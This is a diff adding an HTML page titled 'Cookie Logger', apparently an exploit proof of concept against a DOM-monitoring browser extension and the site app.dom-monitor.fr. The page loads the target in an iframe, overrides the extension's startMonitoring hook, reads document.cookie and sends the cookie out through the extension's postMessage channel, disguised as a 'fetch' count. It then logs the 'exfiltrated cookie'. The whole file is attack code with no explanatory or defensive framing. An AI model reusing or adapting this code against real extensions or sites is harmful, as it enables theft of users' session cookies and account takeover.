@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Cookie Logger</title>
+</head>
+<body>
+  <h1 id="start">Cookie Logger</h1>
+  <script>
+    // Create iframe to the target domain
+    const iframe = document.createElement('iframe');
+    iframe.src = "https://app.dom-monitor.fr/";
+    iframe.style.width = "800px";
+    iframe.style.height = "600px";
+    document.body.appendChild(iframe);
+    
+    // Inject our script into the page context using the extension's monitoring hooks
+    const script = document.createElement('script');
+    script.textContent = `
+      // Directly hook into the startMonitoring function from the extension
+      const originalStartMonitoring = window.startMonitoring || function(){};
+      window.startMonitoring = function() {
+        // Log the cookies directly to console
+        console.log("Cookie data:", document.cookie);
+        
+        // Send cookies through extension's message system
+        window.postMessage({
+          action: "update_counts",
+          counts: { 
+            fetch: document.cookie, // Hide cookie in the fetch count
+            innerHTML: 0, 
+            setAttribute: 0, 
+            eval: 0 
+          },
+          resourceCounts: {}
+        }, "*");
+        
+        // Call original function
+        return originalStartMonitoring.apply(this, arguments);
+      };
+      
+      // Execute now for immediate effect
+      console.log("Cookies from app.dom-monitor.fr:", document.cookie);
+    `;
+    document.body.appendChild(script);
+    
+    // Listen for messages from the extension
+    window.addEventListener("message", function(event) {
+      if (event.data && event.data.action === "update_counts") {
+        // The extension will send data back - check if our cookie is included
+        if (event.data.counts && event.data.counts.fetch) {
+          console.log("Exfiltrated cookie:", event.data.counts.fetch);
+        }
+      }
+    });
+  </script>
+</body>
+</html>
